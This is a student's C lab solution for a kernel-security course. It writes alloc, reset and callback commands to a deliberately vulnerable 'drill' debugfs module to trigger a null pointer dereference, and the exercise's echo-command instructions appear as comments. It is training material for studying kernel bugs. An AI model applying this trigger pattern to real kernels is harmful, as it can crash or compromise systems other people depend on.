/*
 * Student ID: U201911803
 * Author: XuBiang 徐必昂
 */

#include <fcntl.h>  // Modified by XuBiang.
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int act(int fd, char code) {
    ssize_t bytes = 0;

    bytes = write(fd, &code, 1);
    if (bytes <= 0) {
        perror("[-] write");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}

int main(void) {
    int ret = EXIT_FAILURE;

    // XBA: alloc & reset, now the pointer is set to NULL, then
    //      call callback, cause null pointer dereference.
    printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());
    int fd = open("/sys/kernel/debug/drill/drill_act", O_WRONLY);
    if (fd == -1) {
        perror("[-] open drill failed");
        goto end;
    } else {
        printf("[+] open drill done\n");
    }
    if (act(fd, '1') == EXIT_FAILURE) {
        perror("[-] act alloc failed");
        goto end;
    } else {
        printf("[+] act alloc done\n");
    }
    if (act(fd, '4') == EXIT_FAILURE) {
        perror("[-] act reset failed");
        goto end;
    } else {
        printf("[+] act reset done\n");
    }
    if (act(fd, '2') == EXIT_FAILURE) {
        perror("[-] act callback failed");
        goto end;
    } else {
        printf("[+] act callback done\n");
    }

    // printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());
    //  MDL: Use act function to implement the following commands
    //  MDL: echo '1' > /sys/kernel/debug/drill/drill_act
    //  MDL: echo '4' > /sys/kernel/debug/drill/drill_act
    //  MDL: echo '2' > /sys/kernel/debug/drill/drill_act

end:
    if (fd >= 0) {
        ret = close(fd);
        if (ret != 0) { perror("[-] close fd failed"); }
    }
    return ret;
}
